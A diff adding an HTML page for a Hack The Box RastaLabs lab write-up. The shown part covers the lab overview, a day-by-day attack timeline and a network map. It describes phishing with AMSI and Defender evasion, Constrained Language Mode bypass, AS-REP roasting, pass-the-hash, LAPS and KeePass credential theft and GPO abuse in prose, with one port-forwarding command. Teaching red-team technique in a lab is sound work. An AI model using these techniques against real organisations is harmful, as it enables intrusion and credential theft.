@@ -1,0 +1,2001 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RastaLabs — QA210</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<style>
+:root{--bg:#0a0e17;--bg2:#111827;--card:#151d2e;--border:#1e293b;--fg:#e2e8f0;--muted:#94a3b8;--accent:#38bdf8;--accent2:#818cf8;--red:#f87171;--green:#4ade80;--yellow:#facc15;--orange:#fb923c;--pink:#f472b6;--font:'Segoe UI',system-ui,-apple-system,sans-serif;--mono:'Cascadia Code','Fira Code','JetBrains Mono',Consolas,monospace;--radius:8px;--shadow:0 4px 24px rgba(0,0,0,.45);--glow:0 0 30px rgba(56,189,248,.12);--yellow-accent:#facc15}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.75;min-height:100vh;overflow-x:hidden}
+#bg-canvas{position:fixed;inset:0;z-index:-1;opacity:.3}
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.page-wrap{display:flex;max-width:1440px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc{position:sticky;top:56px;width:260px;min-width:260px;height:calc(100vh - 56px);overflow-y:auto;padding:20px 14px;border-right:1px solid var(--border);background:rgba(10,14,23,.85);backdrop-filter:blur(12px);scrollbar-width:thin;scrollbar-color:var(--border) transparent}
+.toc h3{font-size:.68rem;text-transform:uppercase;letter-spacing:2px;color:var(--accent);margin-bottom:10px}
+.toc a{display:block;font-size:.76rem;color:var(--muted);text-decoration:none;padding:3px 0 3px 12px;border-left:2px solid transparent;transition:all .2s}
+.toc a:hover,.toc a.active{color:var(--fg);border-left-color:var(--accent);background:rgba(56,189,248,.06)}
+.toc .toc-sub{padding-left:24px;font-size:.7rem}
+.main{flex:1;padding:36px 48px 80px;max-width:900px}
+.hero{text-align:center;padding:48px 0 36px;border-bottom:1px solid var(--border);margin-bottom:36px}
+.hero .badge{display:inline-block;background:linear-gradient(135deg,var(--red),var(--orange));color:#fff;font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;padding:4px 14px;border-radius:20px;margin-bottom:14px}
+.hero h1{font-size:2.2rem;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--accent2),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:8px}
+.hero .sub{font-size:1rem;color:var(--muted);margin-bottom:20px}
+.hero .meta-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:20px}
+.hero .meta-box{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:12px 6px;text-align:center}
+.meta-box .val{font-size:1.3rem;font-weight:700;color:var(--accent)}
+.meta-box .lbl{font-size:.62rem;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-top:2px}
+.attack-path{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:24px;margin:28px 0;overflow-x:auto}
+.attack-path h3{font-size:.78rem;text-transform:uppercase;letter-spacing:1.5px;color:var(--accent);margin-bottom:14px;text-align:center}
+.path-flow{display:flex;align-items:center;justify-content:center;gap:5px;flex-wrap:wrap}
+.path-node{background:linear-gradient(135deg,rgba(56,189,248,.12),rgba(129,140,248,.12));border:1px solid var(--accent);border-radius:6px;padding:7px 12px;font-size:.7rem;font-weight:600;color:var(--fg);white-space:nowrap;transition:all .25s}
+.path-node:hover{background:linear-gradient(135deg,rgba(56,189,248,.25),rgba(129,140,248,.25));transform:translateY(-2px);box-shadow:var(--glow)}
+.path-arrow{color:var(--accent);font-size:1rem;flex-shrink:0}
+.section{margin-bottom:44px}
+.section h2{font-size:1.5rem;font-weight:700;margin-bottom:18px;padding-bottom:8px;border-bottom:2px solid var(--accent);display:flex;align-items:center;gap:10px}
+.section h2 .icon{font-size:1.2rem}
+.section h3{font-size:1.1rem;font-weight:600;margin:26px 0 12px;color:var(--accent2)}
+.section h4{font-size:.92rem;font-weight:600;margin:18px 0 8px;color:var(--accent)}
+.section p{margin-bottom:13px;color:var(--fg)}
+.section ul,.section ol{margin:10px 0 16px 24px}
+.section li{margin-bottom:6px;color:var(--fg)}
+.callout{border-radius:var(--radius);padding:14px 18px;margin:18px 0;border-left:4px solid;font-size:.88rem}
+.callout p{margin-bottom:7px}.callout p:last-child{margin-bottom:0}
+.callout-info{background:rgba(56,189,248,.08);border-color:var(--accent)}
+.callout-warn{background:rgba(250,204,21,.08);border-color:var(--yellow)}
+.callout-danger{background:rgba(248,113,113,.08);border-color:var(--red)}
+.callout-success{background:rgba(74,222,128,.08);border-color:var(--green)}
+.callout-hint{background:rgba(129,140,248,.08);border-color:var(--accent2)}
+.callout-deadend{background:rgba(251,146,60,.06);border-color:var(--orange)}
+.callout-title{font-weight:700;font-size:.76rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px}
+.callout-info .callout-title{color:var(--accent)}.callout-warn .callout-title{color:var(--yellow)}
+.callout-danger .callout-title{color:var(--red)}.callout-success .callout-title{color:var(--green)}
+.callout-hint .callout-title{color:var(--accent2)}.callout-deadend .callout-title{color:var(--orange)}
+.code-block{position:relative;margin:14px 0;border-radius:var(--radius);overflow:hidden;border:1px solid var(--border)}
+.code-block .code-header{display:flex;align-items:center;justify-content:space-between;background:#1a1f2e;padding:5px 12px;font-size:.68rem;color:var(--muted)}
+.code-block .code-header .lang-tag{font-weight:600;text-transform:uppercase;letter-spacing:1px;color:var(--accent)}
+.code-block pre{margin:0!important;padding:14px!important;font-size:.8rem!important;line-height:1.6!important;background:#0d1117!important}
+.code-block code{font-family:var(--mono)!important;font-size:.8rem!important}
+.copy-btn{background:transparent;border:1px solid var(--border);color:var(--muted);font-size:.63rem;padding:2px 8px;border-radius:4px;cursor:pointer;transition:all .2s}
+.copy-btn:hover{color:var(--fg);border-color:var(--accent)}
+.mitre-badge{display:inline-block;background:rgba(244,114,182,.1);border:1px solid rgba(244,114,182,.25);color:var(--pink);font-size:.63rem;font-weight:600;padding:2px 7px;border-radius:4px;margin:2px;font-family:var(--mono)}
+.data-table{width:100%;border-collapse:collapse;margin:14px 0;font-size:.83rem}
+.data-table th{background:var(--card);padding:9px 12px;text-align:left;font-size:.68rem;text-transform:uppercase;letter-spacing:1px;color:var(--accent);border-bottom:2px solid var(--border)}
+.data-table td{padding:9px 12px;border-bottom:1px solid var(--border);color:var(--fg)}
+.data-table tr:hover td{background:rgba(56,189,248,.04)}
+.data-table code{font-family:var(--mono);font-size:.78rem;color:var(--accent)}
+.flag-box{background:linear-gradient(135deg,rgba(74,222,128,.08),rgba(34,211,238,.08));border:1px solid rgba(74,222,128,.25);border-radius:var(--radius);padding:12px 18px;margin:14px 0;display:flex;align-items:center;gap:12px}
+.flag-box .flag-icon{font-size:1.2rem}.flag-box .flag-name{font-weight:700;color:var(--green);font-size:.83rem;font-family:var(--mono)}.flag-box .flag-detail{font-size:.78rem;color:var(--muted)}
+.network-diagram{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:22px;margin:22px 0;font-family:var(--mono);font-size:.66rem;line-height:1.35;color:var(--muted);overflow-x:auto;white-space:pre}
+.day-box{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:16px 20px;margin:14px 0}
+.day-box .day-num{font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:var(--accent);margin-bottom:7px}
+.day-box .day-summary{font-size:.86rem;color:var(--fg);margin-bottom:7px}.day-box .day-detail{font-size:.8rem;color:var(--muted)}
+.day-box.struggle-day{border-color:rgba(251,146,60,.25)}.day-box.struggle-day .day-num{color:var(--orange)}
+.term-out{background:#0c0c0c;border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px;margin:12px 0;font-family:var(--mono);font-size:.74rem;line-height:1.5;color:#ccc;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+.term-out .prompt{color:var(--accent)}.term-out .err{color:var(--red)}.term-out .ok{color:var(--green)}.term-out .warn{color:var(--yellow)}.term-out .muted{color:#666}
+.operator-sig{text-align:center;padding:28px 0;border-top:1px solid var(--border);margin-top:44px}
+.operator-sig .handle{font-size:1.1rem;font-weight:700;background:linear-gradient(135deg,var(--accent),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.operator-sig .tagline{font-size:.76rem;color:var(--muted);margin-top:4px}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.toc{display:none}
+.main{padding:20px 18px 60px}
+.hero h1{font-size:1.5rem}
+.hero .meta-grid{grid-template-columns:repeat(2,1fr)}
+.path-flow{flex-direction:column}.path-arrow{transform:rotate(90deg)}
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--muted)}
+</style>
+</head>
+<body>
+
+<canvas id="bg-canvas"></canvas>
+
+<!-- ═══════════ HEADER ═══════════ -->
+<header class="site-header">
+  <a href="/" class="brand">
+    <span class="logo-icon">Q</span>
+    QA210<span class="cursor"></span>
+  </a>
+  <nav class="nav-main">
+    <a href="/">Home</a>
+    <a href="/htb/" class="active">Hack The Box</a>
+    <a href="/tjctf-2026/">TJCTF</a>
+    <a href="/tryhackme/">TryHackMe</a>
+    <a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <a href="https://w4llz.me/" target="_blank" class="social-link" title="W4LLZ Team" style="color:var(--yellow-accent)"><i class="bi bi-people-fill"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<!-- Mobile Nav -->
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a>
+    <a href="/htb/">Hack The Box</a>
+    <a href="/tjctf-2026/">TJCTF</a>
+    <a href="/tryhackme/">TryHackMe</a>
+    <a href="/research/">Research</a>
+    <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+    <a href="https://w4llz.me/" target="_blank">W4LLZ Team</a>
+  </nav>
+</div>
+
+<div class="page-wrap">
+
+<!-- ═══════════ TOC ═══════════ -->
+<nav class="toc" id="toc">
+  <h3>Table of Contents</h3>
+  <a href="#overview">Lab Overview</a>
+  <a href="#timeline">Day-by-Day Timeline</a>
+  <a href="#network-map">Network Map</a>
+  <a href="#phase1">Phase 1: Initial Access</a>
+  <a class="toc-sub" href="#p1-recon">DMZ Recon</a>
+  <a class="toc-sub" href="#p1-owa">OWA Brute Force</a>
+  <a class="toc-sub" href="#p1-phishing">Phishing Campaign</a>
+  <a class="toc-sub" href="#p1-amsi">AMSI + Defender Bypass</a>
+  <a class="toc-sub" href="#p1-c2">C2 Setup (Sliver)</a>
+  <a href="#phase2">Phase 2: Situational Awareness</a>
+  <a class="toc-sub" href="#p2-bloodhound">BloodHound Collection</a>
+  <a class="toc-sub" href="#p2-powerview">PowerView Enum</a>
+  <a class="toc-sub" href="#p2-clm">Constrained Language Mode</a>
+  <a href="#phase3">Phase 3: Privilege Escalation</a>
+  <a class="toc-sub" href="#p3-asrep">AS-REP Roasting</a>
+  <a class="toc-sub" href="#p3-token">Token Impersonation</a>
+  <a class="toc-sub" href="#p3-safetykatz">SafetyKatz Credential Dump</a>
+  <a class="toc-sub" href="#p3-hashcrack">Password Cracking</a>
+  <a href="#phase4">Phase 4: Lateral Movement</a>
+  <a class="toc-sub" href="#p4-pth">Pass-the-Hash</a>
+  <a class="toc-sub" href="#p4-pivoting">Pivoting + Port Forwarding</a>
+  <a class="toc-sub" href="#p4-winrm">WinRM Lateral Movement</a>
+  <a class="toc-sub" href="#p4-dcom">DCOM / WMI Execution</a>
+  <a href="#phase5">Phase 5: Credential Harvesting</a>
+  <a class="toc-sub" href="#p5-keepass">KeePass Dump</a>
+  <a class="toc-sub" href="#p5-laps">LAPS Passwords</a>
+  <a class="toc-sub" href="#p5-dpapi">DPAPI Extraction</a>
+  <a class="toc-sub" href="#p5-credchain">Credential Chain</a>
+  <a href="#phase6">Phase 6: Domain Admin</a>
+  <a class="toc-sub" href="#p6-gpo">GPO Abuse</a>
+  <a class="toc-sub" href="#p6-fileserver">File Server Exploitation</a>
+  <a class="toc-sub" href="#p6-dc">DC Compromise</a>
+  <a href="#phase7">Phase 7: CTF Challenges</a>
+  <a class="toc-sub" href="#p7-rop">ROP Challenge</a>
+  <a class="toc-sub" href="#p7-crypto">Cryptography</a>
+  <a class="toc-sub" href="#p7-pcap">PCAP Analysis</a>
+  <a href="#flags">Flag Summary</a>
+  <a href="#lessons">Key Lessons</a>
+</nav>
+
+<div class="main">
+
+<!-- ──── HERO ──── -->
+<section class="hero">
+  <span class="badge">Red Team Operator Level II</span>
+  <h1>RastaLabs<br>Full-Chain Writeup</h1>
+  <p class="sub">QA210 &mdash; 27 days, 14 machines, 17 flags, one very patient adversary</p>
+  <div class="meta-grid">
+    <div class="meta-box"><div class="val">14</div><div class="lbl">Machines</div></div>
+    <div class="meta-box"><div class="val">17</div><div class="lbl">Flags</div></div>
+    <div class="meta-box"><div class="val">1</div><div class="lbl">Domain</div></div>
+    <div class="meta-box"><div class="val">0</div><div class="lbl">CVEs Used</div></div>
+  </div>
+</section>
+
+<div class="attack-path">
+  <h3>Attack Path</h3>
+  <div class="path-flow">
+    <div class="path-node">DMZ Recon<br><small>T1046</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">OWA Brute Force<br><small>T1110.003</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Phishing<br><small>T1566.001</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">WS04 Foothold<br><small>T1059.005</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">SRV01 SYSTEM<br><small>T1068</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">AS-REP Roast<br><small>T1558.004</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">PTH<br><small>T1550.002</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">WinRM WS05<br><small>T1021.006</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">KeePass<br><small>T1003</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">LAPS<br><small>T1003.006</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">GPO Abuse<br><small>T1484.001</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Domain Admin<br><small>T1068</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">DC01<br><small>T1003.006</small></div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 1 — LAB OVERVIEW      -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="overview">
+  <h2><i class="bi bi-building"></i> Lab Overview</h2>
+  <p>RastaLabs is HTB's first Pro Lab and still one of the most respected. It's a Red Team Operator Level II lab designed by RastaMouse (Daniel Duggan, <code>@_RastaMouse</code>) &mdash; the same person behind the CRTO certification. The lab simulates attacking a full Active Directory corporate network from the outside, modeling a fictional security and penetration testing company called RastaLabs, established in 2017, running a Windows Server 2016 functional domain level environment with Exchange, IIS, SQL Server, and Windows 10 clients.</p>
+  <p>Unlike assumed-breach scenarios, you start as an external attacker with zero access &mdash; you have to brute-force OWA and phish your way in. Windows Defender, AppLocker, and Constrained Language Mode are all enabled and actively blocking, so every payload has to be crafted to evade them. The lab features 14 machines total &mdash; one Domain Controller (DC01), 7 Servers, and 6 Workstations &mdash; spread across a segregated network with 4 subnets. You need to capture all 17 flags for the certificate of completion.</p>
+  <p>One thing worth mentioning: the lab can be shortcut. There are paths to DA that skip a lot of the intended attack chain. If you take those shortcuts, the whole lab kind of becomes useless. Don't do it. The real value is in working through the complete kill chain, not in grabbing DA as fast as possible. I forced myself to capture every flag and work through every technique the lab teaches, and I'm glad I did. GPO abuse was the intended path to Domain Admin, not DCSync &mdash; and learning that technique alone was worth the subscription.</p>
+
+  <div class="callout callout-info">
+    <div class="callout-title">About This Writeup</div>
+    <p>This writeup is my personal notes cleaned up and expanded. I'm not giving you step-by-step copy-paste commands for everything &mdash; if you want that, go watch a YouTube video. What I'm giving you is the methodology, the dead ends I hit, and the key insights that made things click. You'll still need to figure out plenty on your own. That's the point.</p>
+  </div>
+
+  <table class="data-table">
+    <thead><tr><th>Attribute</th><th>Detail</th></tr></thead>
+    <tbody>
+      <tr><td>Scenario</td><td>External red team against RastaLabs security company</td></tr>
+      <tr><td>Domain</td><td><code>rastalabs.local</code></td></tr>
+      <tr><td>DC</td><td><code>dc01.rastalabs.local</code> (10.10.120.1)</td></tr>
+      <tr><td>DMZ Network</td><td><code>10.10.110.0/24</code></td></tr>
+      <tr><td>Internal Subnets</td><td><code>10.10.120.0/24</code>, <code>10.10.122.0/24</code>, <code>10.10.123.0/24</code></td></tr>
+      <tr><td>Machines</td><td>14 (1 DC + 7 Servers + 6 Workstations)</td></tr>
+      <tr><td>Flags</td><td>17 (must capture ALL for certificate)</td></tr>
+      <tr><td>Functional Level</td><td>Server 2016</td></tr>
+      <tr><td>Defenses</td><td>Windows Defender + AppLocker + Constrained Language Mode</td></tr>
+      <tr><td>C2 Used</td><td>Sliver (primary)</td></tr>
+      <tr><td>Designer</td><td>RastaMouse (Daniel Duggan, @_RastaMouse)</td></tr>
+      <tr><td>Level</td><td>Red Team Operator Level II</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- DAY-BY-DAY TIMELINE            -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="timeline">
+  <h2><i class="bi bi-calendar3"></i> Day-by-Day Timeline</h2>
+  <p>27 days total. Including all the rabbit holes and wasted time. I went into this with CRTO knowledge and still got humbled repeatedly. The lab will find every gap in your AD exploitation game.</p>
+
+  <div class="day-box">
+    <div class="day-num">Days 1-2 &mdash; "Scanning the DMZ"</div>
+    <div class="day-summary">Nmap sweep of 10.10.110.0/24. Found NIX01, WEB01, MS01 (OWA). Started OWA brute force.</div>
+    <div class="day-detail">Initial nmap scan revealed the DMZ layout: NIX01 at 10.10.110.2 (OpenSSH 7.2p2 Ubuntu), WEB01 at 10.10.110.10 (IIS), and MS01 running Exchange/OWA. The OWA portal was the critical finding &mdash; it's the only way to get internal email access which you need for phishing. Spent the rest of day 2 brute-forcing OWA credentials with a custom wordlist. Got a hit after ~6 hours of spraying.</div>
+  </div>
+
+  <div class="day-box struggle-day">
+    <div class="day-num">Days 3-5 &mdash; "Why is everything quarantined?"</div>
+    <div class="day-summary">Three phishing attempts. All failed. Defender caught every macro and HTA payload.</div>
+    <div class="day-detail">Attempt 1: Standard macro doc with PowerShell cradle &mdash; quarantined instantly. Attempt 2: HTA file hosted on WEB01, sent via OWA email &mdash; quarantined by AMSI. Attempt 3: Macro with string obfuscation but still using PS cradle &mdash; caught again. The lab's bots simulate real users opening emails and running attachments, which is cool but also means you can't just manually test. You need a payload that actually works end-to-end. The OWA access was critical because the phishing emails have to come from within the Exchange environment.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Day 6 &mdash; "First beacon."</div>
+    <div class="day-summary">Phishing attempt 4 landed. Got Sliver session on WS04 as <code>bowen</code>. Lost it 2 hours later to AppLocker.</div>
+    <div class="day-detail">The winning combination: AMSI bypass in VBA + Donut-encrypted shellcode + regsvr32 delivery instead of PowerShell cradle. Phished bowen on WS04 with a macro doc. Got the Sliver session back. Ran basic SA &mdash; whoami, hostname, ipconfig. Then AppLocker killed my implant because I was trying to run an unsigned binary from a temp directory. Need to think about AppLocker from the start, not as an afterthought.</div>
+  </div>
+
+  <div class="day-box struggle-day">
+    <div class="day-num">Days 7-8 &mdash; "AppLocker and Constrained Language Mode"</div>
+    <div class="day-summary">Re-established beacon with proper evasion. Hit Constrained Language Mode. Spent two days on bypass.</div>
+    <div class="day-detail">This is where most people rage-quit. AppLocker blocks executables from user-writable directories. Constrained Language Mode restricts PowerShell to a limited subset &mdash; no Add-Type, no New-Object for COM objects, no reflection. My first attempt at a CLM bypass failed because I was trying to use a technique that required admin privileges I didn't have yet. Had to find a bypass that worked from a standard user context. Eventually got it working through environment variable manipulation before spawning the PowerShell session.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Day 9 &mdash; "BloodHound day."</div>
+    <div class="day-summary">Ran SharpHound. Mapped the entire domain. Found the attack paths.</div>
+    <div class="day-detail">SharpHound collection with all collection methods via execute-assembly. The data showed clear paths: AS-REP roastable accounts, GPO misconfigurations, and LAPS read permissions. Also discovered the full subnet layout: 10.10.120.0/24 for DC and core servers, 10.10.122.0/24 for SQL01 and services, 10.10.123.0/24 for workstations. This was the turning point &mdash; everything after this was execution, not discovery.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Days 10-11 &mdash; "SRV01 SYSTEM and AS-REP Roasting"</div>
+    <div class="day-summary">Escalated to SYSTEM on SRV01. AS-REP Roasted multiple accounts. Got epugh hash.</div>
+    <div class="day-detail">From WS04, found a service misconfiguration on SRV01 that let me get SYSTEM. This was the first real escalation. Then ran AS-REP Roasting &mdash; found epugh had DONT_REQ_PREAUTH set. Got the hash, cracked it to Sarah2017. Also discovered epugh had an admin account: epugh_adm. This was a key pivot point in the lab. The AS-REP roast hash was critical &mdash; it opened up several lateral movement paths.</div>
+  </div>
+
+  <div class="day-box struggle-day">
+    <div class="day-num">Days 12-13 &mdash; "PTH and the WinRM detour"</div>
+    <div class="day-summary">PTH to WS05 via WinRM. Turned out to be an unintentional path. Had to reassess.</div>
+    <div class="day-detail">Used Pass-the-Hash with epugh's NTLM hash to get WinRM access on WS05 (10.10.123.102). Spent two days exploring this path only to realize it was a dead end for progressing toward DA. Found tquinn on WS06 which was somewhat useful, but the real path was through AS-REP roasting, not WinRM lateral movement. Lesson: when BloodHound shows you a path, follow it. Don't go exploring on your own &mdash; you'll waste days.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Days 14-16 &mdash; "KeePass and credential harvesting"</div>
+    <div class="day-summary">Dumped KeePass databases. Got ngodfrey_adm. Read all LAPS passwords.</div>
+    <div class="day-detail">Found a KeePass database on one of the workstations. Dumped it using KeeThief &mdash; got ngodfrey credentials, which led to ngodfrey_adm. Then realized ngodfrey_adm could read the ms-Mcs-AdmPwd attribute on all workstations (LAPS passwords). This was huge &mdash; it gave me local admin on every workstation in the domain. Also extracted DPAPI credentials from several machines, which provided more cached domain credentials.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Day 17 &mdash; "Revisiting workstations"</div>
+    <div class="day-summary">With LAPS passwords, revisited WS01-WS06. Found more credentials and flags.</div>
+    <div class="day-detail">Using the LAPS local admin passwords, I could now access every workstation with admin rights. Found auto-logon credentials for epugh in the registry (LSA secrets), which confirmed the epugh &rarr; epugh_adm chain. Also found ahope's FS01 directory mapping &mdash; net use Q: \\fs01.rastalabs.local\ahope. This directory contained the nix01.ppk key file for SSH access to NIX01. This is one of the flags that you'd miss if you shortcut to DA.</div>
+  </div>
+
+  <div class="day-box struggle-day">
+    <div class="day-num">Days 18-20 &mdash; "WS02 to SQL01 pivot"</div>
+    <div class="day-summary">Pivoted from WS02 to SQL01. Found port forwarding path to WS05 and rweston_da hash.</div>
+    <div class="day-detail">WS02 had network access to the SQL01 subnet (10.10.122.0/24). Set up port forwarding: portfwd add -L 10.10.14.83 -r 10.10.123.102 -l 445 -p 445. Through this pivot chain, reached WS05 and found rweston_da (Domain Admin) hash in LSASS memory. The hash started with ab7b75ff84475be. This was a pivotal moment &mdash; rweston_da is a Domain Admin account. But I didn't use it immediately because I wanted to complete the intended path through GPO abuse.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Days 21-23 &mdash; "GPO Abuse — the real DA path"</div>
+    <div class="day-summary">Mapped GPO permissions. Created, linked, and abused GPOs for Domain Admin.</div>
+    <div class="day-detail">BloodHound showed that our compromised accounts could create, link, and modify GPOs. This is the intended path to DA in RastaLabs. The process: (1) identify which OUs your compromised accounts have GPO creation rights on, (2) create a new GPO that adds your controlled account to the local Administrators group on target machines, (3) link the GPO to the appropriate OU, (4) wait for GPO refresh (or force it with gpupdate), (5) profit. I used SharpGPOAbuse for the modification step. This technique alone was worth the entire lab subscription.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Days 24-25 &mdash; "File server and DC compromise"</div>
+    <div class="day-summary">Exploited FS01. Got Domain Admin on DC01. Full domain compromise.</div>
+    <div class="day-detail">With GPO-granted local admin on DC01, I could dump the domain credentials. Used SafetyKatz for the LSASS dump. DCSync'd all domain hashes. Full Domain Admin on rastalabs.local. Also did a deep dive on FS01 &mdash; found the ahope directory structure, the nix01.ppk key, and several other flags hidden in file shares. The file server post-exploitation section was surprisingly deep.</div>
+  </div>
+
+  <div class="day-box struggle-day">
+    <div class="day-num">Days 26-27 &mdash; "CTF challenges and flag hunting"</div>
+    <div class="day-summary">ROP challenge. PCAP analysis. Crypto flags. The last 4 flags took as long as the first 13.</div>
+    <div class="day-detail">If you don't have binary exploitation experience, these flags will take you days. The ROP challenge on one of the servers required finding the offset, crafting a ROP chain to bypass NX, and getting a shell. The PCAP flag required reading a network dump with NetworkMiner, extracting a secret, and using FileCryptography.psm1 to decode it. Flag 10 was about dumping creds from a vault installed on WS02 &mdash; referenced from rastamouse.me blog. I had to learn basic ROP from scratch during this lab. Not ideal. If you're not a CTF player, spend time on binary exploitation before starting RastaLabs.</div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- NETWORK MAP                    -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="network-map">
+  <h2><i class="bi bi-diagram-3"></i> Network Map</h2>
+  <p>RastaLabs uses a segregated network with four subnets. Your initial access is in the DMZ at <code>10.10.110.0/24</code> and you have to pivot through internal networks to reach the domain controller and other critical servers. The naming convention is functional &mdash; WS for workstations, with servers using descriptive names like FS01, SQL01, etc.</p>
+
+  <div class="network-diagram">+=====================================================================+
+|  RASTALABS DMZ — 10.10.110.0/24                                    |
+|=====================================================================|
+|  NIX01        10.10.110.2     Linux (OpenSSH 7.2p2 Ubuntu)         |
+|  MS01         10.10.110.x     Mail Server (OWA/Exchange)           |
+|  WEB01        10.10.110.10    IIS Web Server (Server 2016)         |
++================ DMZ / Internal Boundary ============================+
+                                    |
++=====================================================================+
+|  RASTALABS CORE — 10.10.120.0/24                                   |
+|=====================================================================|
+|  DC01         10.10.120.1     Domain Controller (Server 2016)      |
+|  SRV01        10.10.120.x     File &amp; Print Server (Server 2016)   |
++=====================================================================+
+                                    |
++=====================================================================+
+|  RASTALABS SERVICES — 10.10.122.0/24                               |
+|=====================================================================|
+|  SQL01        10.10.122.15    SQL Server (Server 2016)             |
+|  FS01         10.10.122.x     File Server (\\fs01.rastalabs.local) |
++=====================================================================+
+                                    |
++=====================================================================+
+|  RASTALABS WORKSTATIONS — 10.10.123.0/24                           |
+|=====================================================================|
+|  WS01         10.10.123.x     Windows 10 Workstation               |
+|  WS02         10.10.123.x     Windows 10 Workstation (Vault flag)  |
+|  WS03         10.10.123.x     Windows 10 Workstation               |
+|  WS04         10.10.123.x     Windows 10 — bowen (phishing target) |
+|  WS05         10.10.123.102   Windows 10 — WinRM target            |
+|  WS06         10.10.123.x     Windows 10 — tquinn                  |
++=====================================================================+</div>
+
+  <table class="data-table">
